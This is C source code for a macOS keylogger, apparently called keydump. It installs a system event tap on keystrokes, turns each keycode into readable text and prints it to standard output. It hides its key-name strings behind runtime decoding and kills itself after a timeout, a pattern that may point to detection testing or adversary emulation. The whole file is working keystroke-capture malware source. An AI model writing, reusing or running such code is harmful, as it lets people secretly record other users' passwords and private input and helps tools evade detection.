#include "keydump.h"

int main(int argc, const char *argv[]) {
  char failedStr[] = { L('F'), L('a'), L('i'), L('l'), L('e'), L('d'), L('.'), L('\n'), '\0' };
  pthread_t kill_thread;
  int return_code;

  // Create an event tap to retrieve keypresses.
  CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown)|CGEventMaskBit(kCGEventFlagsChanged));
  CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, listener, NULL);

  // Exit the program if unable to create the event tap.
  if (!eventTap) {
    DECODE(failedStr);
    printf("%s", failedStr);
    exit(1);
  }

  decode_strings();

  // store the process ID of the main thread
  parent_process = getpid();

  // spawn thread to exit after two minutes
  return_code = pthread_create(&kill_thread, NULL, thread_killer, NULL);

  // Create a run loop source and add enable the event tap.
  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
  CGEventTapEnable(eventTap, true);
  CFRunLoopRun();

  return 0;
}

// handle key press
CGEventRef listener(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
  if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }

  // Retrieve the incoming keycode
  CGKeyCode code = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

  // print the human readable key string and flush the buffer
  printf("%s", key_code(code));
  fflush(stdout);

  return event;
}

// return the pressed key
const char *key_code(int key_code) {
  const char *str;

  switch ((int)key_code) {
      case 0:   return "a";
      case 1:   return "s";
      case 2:   return "d";
      case 3:   return "f";
      case 4:   return "h";
      case 5:   return "g";
      case 6:   return "z";
      case 7:   return "x";
      case 8:   return "c";
      case 9:   return "v";
      case 11:  return "b";
      case 12:  return "q";
      case 13:  return "w";
      case 14:  return "e";
      case 15:  return "r";
      case 16:  return "y";
      case 17:  return "t";
      case 18:  return "1";
      case 19:  return "2";
      case 20:  return "3";
      case 21:  return "4";
      case 22:  return "6";
      case 23:  return "5";
      case 24:  return "=";
      case 25:  return "9";
      case 26:  return "7";
      case 27:  return "-";
      case 28:  return "8";
      case 29:  return "0";
      case 30:  return "]";
      case 31:  return "o";
      case 32:  return "u";
      case 33:  return "[";
      case 34:  return "i";
      case 35:  return "p";
      case 37:  return "l";
      case 38:  return "j";
      case 39:  return "'";
      case 40:  return "k";
      case 41:  return ";";
      case 42:  return "\\";
      case 43:  return ",";
      case 44:  return "/";
      case 45:  return "n";
      case 46:  return "m";
      case 47:  return ".";
      case 50:  return "`";
      case 65:  return decimalStr;
      case 67:  return asteriskStr;
      case 69:  return plusStr;
      case 71:  return clearStr;
      case 75:  return divideStr;
      case 76:  return enterStr;
      case 78:  return hyphenStr;
      case 81:  return equalsStr;
      case 82:  return "0";
      case 83:  return "1";
      case 84:  return "2";
      case 85:  return "3";
      case 86:  return "4";
      case 87:  return "5";
      case 88:  return "6";
      case 89:  return "7";
      case 91:  return "8";
      case 92:  return "9";
      case 36:  return returnStr;
      case 48:  return tabStr;
      case 49:  return " ";
      case 51:  return delStr;
      case 53:  return escStr;
      case 54:  return rightCmdStr;
      case 55:  return leftCmdStr;
      case 56:  return leftShiftStr;
      case 57:  return capsStr;
      case 58:  return leftOptStr;
      case 59:  return leftCtrlStr;
      case 60:  return rightShiftStr;
      case 61:  return rightOptStr;
      case 62:  return rightCtrlStr;
      case 63:  return fnStr;
      case 64:  return f17Str;
      case 72:  return volUpStr;
      case 73:  return volDownStr;
      case 74:  return muteStr;
      case 79:  return f18Str;
      case 80:  return f19Str;
      case 90:  return f20Str;
      case 96:  return f5Str;
      case 97:  return f6Str;
      case 98:  return f7Str;
      case 99:  return f3Str;
      case 100: return f8Str;
      case 101: return f9Str;
      case 103: return f11Str;
      case 105: return f13Str;
      case 106: return f16Str;
      case 107: return f14Str;
      case 109: return f10Str;
      case 111: return f12Str;
      case 113: return f15Str;
      case 114: return helpStr;
      case 115: return homeStr;
      case 116: return pgupStr;
      case 117: return fwdelStr;
      case 118: return f4Str;
      case 119: return endStr;
      case 120: return f2Str;
      case 121: return pgdownStr;
      case 122: return f1Str;
      case 123: return leftStr;
      case 124: return rightStr;
      case 125: return downStr;
      case 126: return upStr;
    }

    return unknownStr;
}

// decode special key strings in place
void *decode_strings() {
  DECODE(decimalStr);
  DECODE(asteriskStr);
  DECODE(plusStr);
  DECODE(clearStr);
  DECODE(divideStr);
  DECODE(enterStr);
  DECODE(hyphenStr);
  DECODE(equalsStr);
  DECODE(returnStr);
  DECODE(tabStr);
  DECODE(delStr);
  DECODE(escStr);
  DECODE(rightCmdStr);
  DECODE(leftCmdStr);
  DECODE(leftShiftStr);
  DECODE(capsStr);
  DECODE(leftOptStr);
  DECODE(leftCtrlStr);
  DECODE(rightShiftStr);
  DECODE(rightOptStr);
  DECODE(rightCtrlStr);
  DECODE(fnStr);
  DECODE(f17Str);
  DECODE(volUpStr);
  DECODE(volDownStr);
  DECODE(muteStr);
  DECODE(f18Str);
  DECODE(f19Str);
  DECODE(f20Str);
  DECODE(f5Str);
  DECODE(f6Str);
  DECODE(f7Str);
  DECODE(f3Str);
  DECODE(f8Str);
  DECODE(f9Str);
  DECODE(f11Str);
  DECODE(f13Str);
  DECODE(f16Str);
  DECODE(f14Str);
  DECODE(f10Str);
  DECODE(f12Str);
  DECODE(f15Str);
  DECODE(helpStr);
  DECODE(homeStr);
  DECODE(pgupStr);
  DECODE(fwdelStr);
  DECODE(f4Str);
  DECODE(endStr);
  DECODE(f2Str);
  DECODE(pgdownStr);
  DECODE(f1Str);
  DECODE(leftStr);
  DECODE(rightStr);
  DECODE(downStr);
  DECODE(upStr);
  DECODE(unknownStr);

  return 0;
}

// sleep for little while then kill the parent process
void *thread_killer() {
  sleep(DEFAULT_TIMEOUT);
  int die = kill(parent_process, SIGKILL);
  exit(0);
}
